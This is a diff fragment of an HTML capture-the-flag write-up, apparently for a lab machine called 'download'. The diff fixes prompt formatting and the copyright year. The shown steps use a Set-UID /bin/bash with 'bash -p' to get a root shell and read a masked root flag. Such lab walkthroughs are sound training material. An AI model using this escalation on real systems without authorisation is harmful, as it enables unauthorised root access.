+<div class="highlight"><pre><span></span><span class="nd">wesley@download</span><span class="p">:</span><span class="o">~/</span><span class="n">privesc</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">l</span> <span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span>
 <span class="o">-</span><span class="n">rwsr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">1</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">1183448</span> <span class="n">Apr</span> <span class="mi">18</span>  <span class="mi">2022</span> <span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span>
-<span class="nd">@wesley@download</span><span class="p">:</span><span class="o">~/</span><span class="n">privesc</span><span class="err">$</span>
+<span class="nd">wesley@download</span><span class="p">:</span><span class="o">~/</span><span class="n">privesc</span><span class="err">$</span>
 </pre></div>
 
 It is <code>Set-UID</code>, so let's execute <code>bash -p</code> and subsequently read the last flag:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@wesley@download</span><span class="p">:</span><span class="o">~/</span><span class="n">privesc</span><span class="err">$</span> <span class="n">bash</span> <span class="o">-</span><span class="n">p</span>
+<div class="highlight"><pre><span></span><span class="nd">wesley@download</span><span class="p">:</span><span class="o">~/</span><span class="n">privesc</span><span class="err">$</span> <span class="n">bash</span> <span class="o">-</span><span class="n">p</span>
 <span class="n">bash</span><span class="o">-</span><span class="mf">5.0</span><span class="root1">#</span><span class="n"> cd /root</span>
 <span class="n">bash</span><span class="o">-</span><span class="mf">5.0</span><span class="root1">#</span><span class="n"> cat root.txt</span>
 <span class="n">fb5e5</span><span class="o">**********************</span><span class="mi">96</span><span class="n">b50</span>
@@ -875,7 +875,7 @@ It is <code>Set-UID</code>, so let's execute <code>bash -p</code> and subsequent
     </section>
 
     <footer>
-        <p>&copy; 2023 elswix.github.io</p>
+        <p>&copy; 2024 elswix.github.io</p>
     </footer>
 </body>
 </html>
